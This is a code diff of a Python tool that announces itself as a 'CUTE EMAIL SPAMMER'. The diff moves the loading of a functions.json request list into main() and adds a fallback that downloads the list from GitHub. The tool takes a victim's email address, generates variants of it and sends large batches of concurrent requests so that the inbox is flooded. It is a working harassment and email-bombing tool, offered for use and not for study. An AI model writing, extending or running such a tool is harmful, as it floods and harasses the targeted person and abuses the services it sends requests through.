@@ -60,14 +60,6 @@ def update_progress():
     if progress >= total:
         print("\r")
 
-
-
-with open("functions.json", "r") as file:
-    functions = json.load(file)
-
-with open("functions.json", "w") as file:
-    json.dump(functions, file, indent=2)
-
 async def fetch(session: aiohttp.ClientSession, sub: str, info):
     def fix(lol):
         return json.loads(json.dumps(lol)
@@ -104,63 +96,74 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info):
     update_progress()
 
 async def main():
-    # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
-    print("""
-     ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
-    ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
-    ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
-    ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
-    ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
-    ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
-      ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
-    ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
-    ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
-    ░                                                                                                                                                 
-    """)
-    global progress, total, password
-    password = ""
-    samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
-    for _ in samples:
-        password += "".join(random.sample(_, k=5))
-    password = "!" + "".join(random.sample(password, k=len(password)))
-
-    email = None
-    while True:
-        email = input("type cute email address here: ").strip().lower()
-        if validate_email(email):
-            break
-        print("🤬 invalid email")
-
-    variants = generate_email_variants(email)
-
-    threads = None
-    print("(i do NOT recommend more than 1000 threads)")
-    while True:
-        try:
-            limit = clamp(len(variants), 1, cap or float("inf"))
-            threads = input(f"threads per batch (1-{limit}): ")
-            if threads == "":
-                threads = limit
-            threads = clamp(int(threads), 1, limit)
-            break
-        except:
-            print("🤬 that is not a number")
-
-    variants = variants[:threads]
-    total = len(functions) * len(variants)
-    divide()
-    print("📌 useless session info")
-    info = {
-        "THREADS": threads,
-        "EMAIL": email,
-        "PASSWORD": password,
-    }
-    print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
-    divide()
-    print(f"😼 sending some cute emails :3")
-    print("🔋 initializing...", end="\r")
-    start = time.time()
     async with aiohttp.ClientSession() as session:
+        try:
+            with open("functions.json", "r") as file:
+                functions = json.load(file)
+            with open("functions.json", "w") as file:
+                json.dump(functions, file, indent=2)
+        except Exception:
+            print("no data found, downloading...")
+            async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
+                functions = await resp.json()
+                print("beep boop data downloaded")
+        
+        # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
+        print("""
+        ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
+        ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
+        ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
+        ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
+        ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
+        ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
+        ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
+        ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
+        ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
+        ░                                                                                                                                                 
+        """)
+        global progress, total, password
+        password = ""
+        samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
+        for _ in samples:
+            password += "".join(random.sample(_, k=5))
+        password = "!" + "".join(random.sample(password, k=len(password)))
+
+        email = None
+        while True:
+            email = input("type cute email address here: ").strip().lower()
+            if validate_email(email):
+                break
+            print("🤬 invalid email")
+
+        variants = generate_email_variants(email)
+
+        threads = None
+        print("(i do NOT recommend more than 1000 threads)")
+        while True:
+            try:
+                limit = clamp(len(variants), 1, cap or float("inf"))
+                threads = input(f"threads per batch (1-{limit}): ")
+                if threads == "":
+                    threads = limit
+                threads = clamp(int(threads), 1, limit)
+                break
+            except:
+                print("🤬 that is not a number")
+
+        variants = variants[:threads]
+        total = len(functions) * len(variants)
+        divide()
+        print("📌 useless session info")
+        info = {
+            "THREADS": threads,
+            "EMAIL": email,
+            "PASSWORD": password,
+        }
+        print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
+        divide()
+        print(f"😼 sending some cute emails :3")
+        print("🔋 initializing...", end="\r")
+        start = time.time()
         tasks = [asyncio.create_task(fetch(session, sub, values)) for sub in variants for values in functions.values()]
         for j in range(0, len(tasks), size):
             await asyncio.gather(*tasks[j:j+size])
